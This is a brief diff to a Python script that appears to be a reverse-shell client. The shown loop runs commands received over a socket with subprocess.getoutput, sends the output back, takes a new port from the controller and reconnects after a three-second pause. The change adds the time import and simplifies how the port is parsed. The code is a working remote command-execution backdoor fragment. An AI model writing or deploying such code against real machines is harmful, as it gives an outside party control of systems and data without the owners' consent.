@@ -6,6 +6,7 @@ Author: Russell Harvey
 
 import socket
 import subprocess
+import time
 
 BUFFER = 1024
 
@@ -22,8 +23,7 @@ def main():
         output = subprocess.getoutput(command)
         s.send(output.encode())
         new_info = s.recv(BUFFER).decode()
-        new_info = new_info.split(":")
-        ip = new_info[0]
-        port = int(new_info[1])
+        port = int(new_info)
         s.close()
+        time.sleep(3)
     s.close()
